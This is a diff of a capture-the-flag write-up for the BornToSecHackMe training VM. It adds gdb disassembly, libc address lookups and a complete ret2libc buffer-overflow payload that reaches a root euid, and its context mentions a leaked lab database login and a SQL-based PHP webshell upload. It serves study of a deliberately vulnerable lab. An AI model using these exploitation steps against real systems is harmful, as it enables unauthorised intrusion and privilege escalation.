@@ -158,34 +158,13 @@ You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
 Best regards.
 ```
 
-### Database
-
-In the **phpMyAdmin** interface, we find a database containing a table named **userdata**, which holds the forum users and their passwords. Among the users, there is an **admin** account with the following password hash: 
-`ed0fd64f25f3bd3a54f8d272ba93b6e76ce7f3d0516d551c28`.
-
-### Crack the Admin Password
-
-Upon examining the forum's source code, we discover that the forum was created using a PHP framework called **mylittleforum** version 2.3.4, which fortunately is open-source.
-
-We look at the source code to find the password hashing algorithm, and here’s what we find:
-
-```php
-function generate_pw_hash($pw)
-{
-  $salt = random_string(10,'0123456789abcdef');
-  $salted_hash = sha1($pw.$salt);
-  $hash_with_salt = $salted_hash.$salt;
-  return $hash_with_salt;
-}
-```
-
 The password is hashed with a salt, making it practically uncrackable due to the random string appended to the hash.
 
 ## 5. SQL
 
 However, having access to **phpMyAdmin** allows us to execute arbitrary SQL code. We can potentially use this to upload a PHP file that will execute commands on the server.
 
-We try creating a PHP file that can be accessed from the browser and executed. After testing various accessible directories (`/images`, `/themes`, `/includes/`), we find that only the `/templates_c/` directory works.
+We try creating a PHP file that can be accessed from the browser and executed. After testing various accessible directories (`/images/`, `/themes/`, `/includes/`), we find that only the `/templates_c/` directory works.
 
 We run the following SQL query to upload a PHP script into the directory:
 
@@ -441,7 +420,7 @@ The input is a number sequence: `4 2 6 3 1 5`
 
 ### Concatenating the Password
 
-To derive the password for the **thor** user, we concatenate the correct strings from all phases, following the hint in the **README** about no spaces in the password:
+To derive the password for the **thor** user, we concatenate the correct strings from all phases, following the rule in the **README** about no spaces in the password:
 
 **Password for thor:**
 ```
@@ -565,7 +544,7 @@ zaz@BornToSecHackMe:~$
 
 ## 11. zaz session
 
-After logging as the **zaz** user, we find an **exploit_me** binary in the home directory.
+After logging as the **zaz** user, we find an setuid guid **exploit_me** binary in the home directory.
 
 ### Reversing the Binary with Binary Ninja
 
@@ -582,18 +561,77 @@ After logging as the **zaz** user, we find an **exploit_me** binary in the home 
 080483f4  }
 ```
 
+```asm
+(gdb) disas main
+Dump of assembler code for function main:
+   0x080483f4 <+0>:     push   %ebp
+   0x080483f5 <+1>:     mov    %esp,%ebp
+   0x080483f7 <+3>:     and    $0xfffffff0,%esp
+   0x080483fa <+6>:     sub    $0x90,%esp
+   0x08048400 <+12>:    cmpl   $0x1,0x8(%ebp)
+   0x08048404 <+16>:    jg     0x804840d <main+25>
+   0x08048406 <+18>:    mov    $0x1,%eax
+   0x0804840b <+23>:    jmp    0x8048436 <main+66>
+   0x0804840d <+25>:    mov    0xc(%ebp),%eax
+   0x08048410 <+28>:    add    $0x4,%eax
+   0x08048413 <+31>:    mov    (%eax),%eax
+   0x08048415 <+33>:    mov    %eax,0x4(%esp)
+   0x08048419 <+37>:    lea    0x10(%esp),%eax
+   0x0804841d <+41>:    mov    %eax,(%esp)
+   0x08048420 <+44>:    call   0x8048300 <strcpy@plt>
+   0x08048425 <+49>:    lea    0x10(%esp),%eax
+   0x08048429 <+53>:    mov    %eax,(%esp)
+   0x0804842c <+56>:    call   0x8048310 <puts@plt>
+   0x08048431 <+61>:    mov    $0x0,%eax
+   0x08048436 <+66>:    leave  
+   0x08048437 <+67>:    ret    
+End of assembler dump.
+(gdb) 
+```
+
 ### Exploiting the Binary with ret2libc
 
 The binary `exploit_me` is vulnerable to a **buffer overflow** in its use of `strcpy` without checking the size of the input. The goal is to exploit this overflow to perform a **ret2libc attack**, which involves hijacking the return address to execute the `system` function in libc, passing `/bin/bash` as an argument.
 
-### Breakdown of the Payload:
+Finding the necessary addresses in libc:
+```bash
+(gdb) info proc map
+process 1894
+Mapped address spaces:
+
+        Start Addr   End Addr       Size     Offset objfile
+         0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
+         0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
+        0xb7e2b000 0xb7e2c000     0x1000        0x0 
+        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fd2000 0xb7fd5000     0x3000        0x0 
+        0xb7fdb000 0xb7fdd000     0x2000        0x0 
+        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+
+(gdb) find 0xb7e2c000,0xb7fdd000,"/bin/sh"
+0xb7f8cc58 -> /x58/xcc/xf8/xb7
+
+(gdb) info function system
+0xb7e6b060  system -> /x60/xb0/xe6/xb7
+
+(gdb) info function exit
+0xb7e5ebe0  exit -> /xe0/xeb/xe5/xb7
+```
+
+### Final payload
 1. **`'A' * 140`**: Fills the buffer and overflows to overwrite the saved `EBP`.
 2. **`'\x60\xb0\xe6\xb7'`**: The address of `system` in libc.
 3. **`'\xe0\xeb\xe5\xb7'`**: The fake return address `exit`, used to avoid a crash after `system` finishes.
 4. **`'\x58\xcc\xf8\xb7'`**: The address of the string `/bin/bash` in libc, passed as an argument to `system`.
 
-The payload used is:
 
+The payload used is:
 ```bash
 ./exploit_me $(python -c "print('A' * 140 + '\x60\xb0\xe6\xb7' + '\xe0\xeb\xe5\xb7' + '\x58\xcc\xf8\xb7')")
 ```
@@ -601,5 +639,5 @@ The payload used is:
 ```bash
 root@BornToSecHackMe:~$ id
 
-uid=0(root) gid=0(root) groups=0(root)
+uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
 ``` 
